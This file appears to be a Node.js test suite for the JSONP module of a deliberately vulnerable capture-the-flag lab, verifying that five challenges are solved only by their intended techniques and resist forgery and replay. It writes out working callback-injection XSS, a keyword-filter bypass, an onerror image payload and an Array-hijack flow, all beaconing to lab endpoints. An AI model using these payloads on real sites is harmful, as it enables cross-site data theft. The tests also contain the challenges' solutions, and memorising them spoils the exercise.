'use strict';
// JSONP module: every challenge must be solvable by the documented technique
// and must NOT be solvable by the obvious shortcut (token-less beacon, forged
// secret, literal alert, forged items, or scraped shares). Tokens and secrets
// are never rendered raw: feeds carry share arrays, and the tests rebuild the
// values by executing the documented computation, the way real payload code
// running in a page would.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

// The documented combine computation, run as real JavaScript: the feeds
// carry the token and the secret only as two hex share strings, and executed
// payload code XORs them back together at runtime.
function combineHex(a, b) {
  let s = '';
  for (let i = 0; i + 1 < a.length && i + 1 < b.length; i += 2) {
    s += String.fromCharCode(parseInt(a.substr(i, 2), 16) ^ parseInt(b.substr(i, 2), 16));
  }
  return s;
}
const COMBINE = 'combineHex(d.pxa,d.pxk)';

function shareOf(text, name) {
  const m = text.match(new RegExp('"' + name + '":"([a-f0-9]+)"'));
  assert.ok(m, 'share ' + name + ' not found in JSONP response');
  return m[1];
}

function tokenOf(text) {
  return combineHex(shareOf(text, 'pxa'), shareOf(text, 'pxk'));
}

function secretOf(text) {
  return combineHex(shareOf(text, 'sA'), shareOf(text, 'sK'));
}

// Execute a JSONP response body in a sandbox (the attacker's page loading it
// as a script) and return the beacon URLs its fetch calls produced.
function executeFeed(text) {
  const calls = [];
  const ctx = {
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({}) }); },
    combineHex,
    document: { getElementById: () => ({ textContent: '', innerHTML: '' }), body: { textContent: text } },
  };
  ctx.window = ctx;
  ctx.top = ctx;
  vm.createContext(ctx);
  vm.runInContext(text, ctx, { timeout: 1000 });
  return calls;
}

function itemsOf(text) {
  const start = text.indexOf('new Array(');
  const end = text.lastIndexOf('));');
  assert.ok(start !== -1 && end !== -1 && end > start, 'new Array(...) feed body not found');
  return JSON.parse(`[${text.slice(start + 'new Array('.length, end)}]`);
}

test('jsonp module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'jsonp', id);

  await t.test('module page renders, links resolve, no em dash, no flag leak', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/jsonp');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 5);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of [
      '/jsonp/user',
      '/jsonp/data',
      '/jsonp/filtered',
      '/jsonp/legacy',
      '/jsonp/snippet',
      '/jsonp/attacker',
      '/jsonp/array-attacker',
      '/jsonp/beacon-xss',
    ]) {
      const r = await c.get(href);
      assert.notEqual(r.status, 404, href);
    }
  });

  await t.test('callback-xss: scraped shares earn nothing, an executed arrow callback with the rebuilt token wins', async () => {
    const c = client(srv.base);
    const feed = await c.get('/jsonp/user?callback=cb');
    // The raw token never appears in the feed body: only share strings.
    assert.ok(shareOf(feed.text, 'pxa').length > 0, 'shares present');
    assert.ok(!/"token":"[a-f0-9]{32}"/.test(feed.text), 'no raw token in feed');
    // Scraping the shares and guessing the token format earns nothing.
    const shares = feed.text.match(/"pxa":"([a-f0-9]+)"/);
    assert.ok(shares, 'shares scrapable');
    const forged = await c.get('/jsonp/beacon-xss?v=callback-xss&n=' + encodeURIComponent(shares[1]));
    assert.equal(forged.status, 400, 'share array is not the token');
    assert.equal((await c.get('/jsonp/beacon-xss?v=callback-xss&n=deadbeefdeadbeefdeadbeefdeadbeef')).status, 400);
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:Callback XSS')));
    // The real exploit: load the response as a script so the arrow-function
    // callback executes with the data, rebuilds the token, and beacons it.
    const cb = `(d=>fetch('/jsonp/beacon-xss?v=callback-xss&n='+${COMBINE}))`;
    const tampered = await c.get(`/jsonp/user?callback=${encodeURIComponent(cb)}`);
    assert.ok(tampered.headers.get('content-type').includes('application/javascript'));
    const calls = executeFeed(tampered.text);
    assert.equal(calls.length, 1, 'the executed payload must fire exactly one beacon');
    const good = await c.get(calls[0]);
    assert.equal(good.status, 200);
    assert.ok(good.text.includes(flagOf('callback-xss')), 'beacon page shows the flag');
    assert.ok((await capturedSet(c)).includes('jsonp:Callback XSS'));
    // Replay fails: nonces are single-use.
    assert.equal((await c.get(calls[0])).status, 400, 'nonce is single-use: replay must fail');
  });

  await t.test('csrf-data: forged beacon fails, secret rebuilt from the feed wins', async () => {
    const c = client(srv.base);
    const forged = await c.postJson('/jsonp/beacon', { secret: 'made-up-secret' });
    assert.equal(forged.status, 400, 'forged secret must not award');
    assert.equal(forged.body.flag, undefined);
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:JSONP Data Theft')));
    const feed = await c.get('/jsonp/data?callback=steal');
    const secret = secretOf(feed.text);
    assert.ok(!feed.text.includes(secret), 'raw secret must not appear in the feed body');
    const hit = await c.postJson('/jsonp/beacon', { secret });
    assert.equal(hit.body.ok, true);
    assert.equal(hit.body.flag, flagOf('csrf-data'));
    assert.ok((await capturedSet(c)).includes('jsonp:JSONP Data Theft'));
  });

  await t.test('filter-bypass: literal alert is blocked, concat payload executed with the rebuilt token wins', async () => {
    const c = client(srv.base);
    const blocked = await c.get(`/jsonp/filtered?callback=${encodeURIComponent('alert(1)')}`);
    assert.equal(blocked.status, 400, 'literal "alert" callback must be blocked');
    const cb = `(d=>top['fe'+'tch']('/jsonp/beacon-xss?v=filter-bypass&n='+${COMBINE}))`;
    const feed = await c.get(`/jsonp/filtered?callback=${encodeURIComponent(cb)}`);
    assert.equal(feed.status, 200);
    const calls = executeFeed(feed.text);
    assert.equal(calls.length, 1, 'the executed payload must fire exactly one beacon');
    const good = await c.get(calls[0]);
    assert.equal(good.status, 200);
    assert.ok(good.text.includes(flagOf('filter-bypass')));
    assert.ok((await capturedSet(c)).includes('jsonp:Callback Filter Bypass'));
  });

  await t.test('filter-bypass: plain callback with no concat attempt earns nothing', async () => {
    const c = client(srv.base);
    const feed = await c.get('/jsonp/filtered?callback=plain');
    assert.equal(feed.status, 200);
    const bad = await c.get(`/jsonp/beacon-xss?v=filter-bypass&n=${tokenOf(feed.text)}`);
    assert.equal(bad.status, 400, 'no recorded concat attempt: beacon must fail');
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:Callback Filter Bypass')));
  });

  await t.test('array-hijack: raw scraped items fail, hijacked items with the rebuilt token win', async () => {
    const c = client(srv.base);
    const forged = await c.postJson('/jsonp/array-beacon', { items: ['alice:A1', 'feed-token:guess'] });
    assert.equal(forged.status, 400, 'forged token must not award');
    assert.equal(forged.body.flag, undefined);
    const feed = await c.get('/jsonp/legacy?callback=gotFriends');
    const items = itemsOf(feed.text);
    assert.ok(items.includes('alice:A1'), 'feed must list the friends');
    assert.ok(items.some((i) => i.startsWith('feed-sharea:')), 'feed must carry token share a');
    assert.ok(items.some((i) => i.startsWith('feed-sharek:')), 'feed must carry token share k');
    assert.ok(!items.some((i) => i.startsWith('feed-token:')), 'raw token must not be a feed item');
    // The old cheat: beaconing the scraped items verbatim earns nothing.
    const scraped = await c.postJson('/jsonp/array-beacon', { items });
    assert.equal(scraped.status, 400, 'scraped share items must not award');
    assert.ok(!(await capturedSet(c)).some((s) => s.includes('jsonp:Array Constructor Hijack')));
    // The real flow rebuilds the token from the shares (as the hijack page
    // does at runtime) and includes it with the captured items.
    const a = items.find((i) => i.startsWith('feed-sharea:')).slice('feed-sharea:'.length);
    const k = items.find((i) => i.startsWith('feed-sharek:')).slice('feed-sharek:'.length);
    let tok = '';
    for (let i = 0; i + 1 < a.length; i += 2) tok += String.fromCharCode(parseInt(a.substr(i, 2), 16) ^ parseInt(k.substr(i, 2), 16));
    const hit = await c.postJson('/jsonp/array-beacon', { items: items.concat(['feed-token:' + tok]) });
    assert.equal(hit.body.ok, true);
    assert.equal(hit.body.flag, flagOf('array-hijack'));
    assert.ok((await capturedSet(c)).includes('jsonp:Array Constructor Hijack'));
  });

  await t.test('mimetype: served as text/html, HTML callback executed with the rebuilt token wins', async () => {
    const c = client(srv.base);
    const plain = await c.get('/jsonp/snippet?callback=cb');
    assert.ok(plain.headers.get('content-type').includes('text/html'), 'snippet must be text/html');
    const bad = await c.get('/jsonp/beacon-xss?v=mimetype&n=deadbeefdeadbeefdeadbeefdeadbeef');
    assert.equal(bad.status, 400, 'token-less beacon must not award');
    // The real flow: the response is parsed as a document, the injected
    // markup's handler runs there and rebuilds the token from the document
    // text's share arrays.
    const onerror = `var t=document.body.textContent;var a=t.match(/"pxa":"([a-f0-9]+)"/)[1];`
      + `var k=t.match(/"pxk":"([a-f0-9]+)"/)[1];`
      + `fetch('/jsonp/beacon-xss?v=mimetype&n='+combineHex(a,k))`;
    const cb = `<img src=x onerror="${onerror}">`;
    const feed = await c.get(`/jsonp/snippet?callback=${encodeURIComponent(cb)}`);
    assert.equal(feed.status, 200);
    assert.ok(!feed.text.includes(tokenOf(feed.text)), 'raw token must not appear in the snippet');
    // Simulate the browser firing the handler inside the parsed document.
    const handlerCalls = [];
    const ctx = { fetch: (u) => { handlerCalls.push(String(u)); return Promise.resolve({}); }, combineHex, document: { body: { textContent: feed.text } } };
    vm.createContext(ctx);
    vm.runInContext(onerror, ctx, { timeout: 1000 });
    assert.equal(handlerCalls.length, 1, 'the handler must fire exactly one beacon');
    const good = await c.get(handlerCalls[0]);
    assert.equal(good.status, 200);
    assert.ok(good.text.includes(flagOf('mimetype')));
    assert.ok((await capturedSet(c)).includes('jsonp:JSONP MIME Sniffing'));
  });

  await t.test('scoreboard counts each captured challenge exactly once', async () => {
    const c = client(srv.base);
    const beaconFrom = async (feedPromise) => {
      const feed = await feedPromise;
      const calls = executeFeed(feed.text);
      assert.equal(calls.length, 1);
      return c.get(calls[0]);
    };
    const cbx = `(d=>fetch('/jsonp/beacon-xss?v=callback-xss&n='+${COMBINE}))`;
    await beaconFrom(c.get(`/jsonp/user?callback=${encodeURIComponent(cbx)}`));
    const f2 = await c.get('/jsonp/data?callback=steal');
    await c.postJson('/jsonp/beacon', { secret: secretOf(f2.text) });
    const cbp = `(d=>top['fe'+'tch']('/jsonp/beacon-xss?v=filter-bypass&n='+${COMBINE}))`;
    const f3 = await c.get(`/jsonp/filtered?callback=${encodeURIComponent(cbp)}`);
    const calls3 = executeFeed(f3.text);
    await c.get(calls3[0]);
    await c.get(calls3[0]);
    const f4 = await c.get('/jsonp/legacy?callback=gotFriends');
    const items = itemsOf(f4.text);
    const a = items.find((i) => i.startsWith('feed-sharea:')).slice('feed-sharea:'.length);
    const k = items.find((i) => i.startsWith('feed-sharek:')).slice('feed-sharek:'.length);
    let tok = '';
    for (let i = 0; i + 1 < a.length; i += 2) tok += String.fromCharCode(parseInt(a.substr(i, 2), 16) ^ parseInt(k.substr(i, 2), 16));
    const hijacked = items.concat(['feed-token:' + tok]);
    await c.postJson('/jsonp/array-beacon', { items: hijacked });
    await c.postJson('/jsonp/array-beacon', { items: hijacked });
    const onerror = `var t=document.body.textContent;var a=t.match(/"pxa":"([a-f0-9]+)"/)[1];`
      + `var k=t.match(/"pxk":"([a-f0-9]+)"/)[1];`
      + `fetch('/jsonp/beacon-xss?v=mimetype&n='+combineHex(a,k))`;
    const f5 = await c.get(`/jsonp/snippet?callback=${encodeURIComponent(`<img src=x onerror="${onerror}">`)}`);
    const handlerCalls = [];
    const ctx = { fetch: (u) => { handlerCalls.push(String(u)); return Promise.resolve({}); }, combineHex, document: { body: { textContent: f5.text } } };
    vm.createContext(ctx);
    vm.runInContext(onerror, ctx, { timeout: 1000 });
    await c.get(handlerCalls[0]);
    const got = (await capturedSet(c)).filter((s) => s.startsWith('jsonp:'));
    assert.deepEqual(got.sort(), [
      'jsonp:Array Constructor Hijack',
      'jsonp:Callback Filter Bypass',
      'jsonp:Callback XSS',
      'jsonp:JSONP Data Theft',
      'jsonp:JSONP MIME Sniffing',
    ].sort());
  });
});

// ---------------------------------------------------------------------------
// A1B adversarial negatives (appended): beacon replay after rotation for the
// secret and Array-token flows, foreign-session secrets, and cross-vuln use
// of a rebuilt feed token.
// ---------------------------------------------------------------------------
test('jsonp A1B adversarial negatives', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'jsonp', id);

  await t.test('csrf-data: replaying the stolen secret after the win earns nothing', async () => {
    const c = client(srv.base);
    const feed = await c.get('/jsonp/data?callback=steal');
    const secret = secretOf(feed.text);
    const hit = await c.postJson('/jsonp/beacon', { secret });
    assert.equal(hit.body.ok, true);
    assert.equal(hit.body.flag, flagOf('csrf-data'));
    const replay = await c.postJson('/jsonp/beacon', { secret });
    assert.equal(replay.status, 400, 'the secret rotates on award: replay must fail');
    assert.equal(replay.body.flag, undefined);
    // A different session cannot spend the first session secret either.
    const other = client(srv.base);
    const foreign = await other.postJson('/jsonp/beacon', { secret });
    assert.equal(foreign.status, 400, 'a foreign session secret must not award');
  });

  await t.test('array-hijack: replaying the hijack beacon earns nothing', async () => {
    const c = client(srv.base);
    const feed = await c.get('/jsonp/legacy?callback=gotFriends');
    const items = itemsOf(feed.text);
    const a = items.find((i) => i.startsWith('feed-sharea:')).slice('feed-sharea:'.length);
    const k = items.find((i) => i.startsWith('feed-sharek:')).slice('feed-sharek:'.length);
    const tok = combineHex(a, k);
    const payload = { items: items.concat(['feed-token:' + tok]) };
    const hit = await c.postJson('/jsonp/array-beacon', payload);
    assert.equal(hit.body.ok, true);
    assert.equal(hit.body.flag, flagOf('array-hijack'));
    const replay = await c.postJson('/jsonp/array-beacon', payload);
    assert.equal(replay.status, 400, 'the feed token rotates on award: replay must fail');
    assert.equal(replay.body.flag, undefined);
  });

  await t.test('beacon-xss: a rebuilt token is bound to its own vuln and single-use', async () => {
    const c = client(srv.base);
    const feed = await c.get('/jsonp/user?callback=cb');
    const tok = tokenOf(feed.text);
    assert.equal((await c.get('/jsonp/beacon-xss?v=mimetype&n=' + tok)).status, 400, 'callback-xss token must not award mimetype');
    assert.equal((await c.get('/jsonp/beacon-xss?v=filter-bypass&n=' + tok)).status, 400, 'callback-xss token must not award filter-bypass');
    const hit = await c.get('/jsonp/beacon-xss?v=callback-xss&n=' + tok);
    assert.equal(hit.status, 200, 'cross-vuln attempts must not consume the token');
    assert.ok(hit.text.includes(flagOf('callback-xss')));
    assert.equal((await c.get('/jsonp/beacon-xss?v=callback-xss&n=' + tok)).status, 400, 'replayed beacon must not award');
  });
});
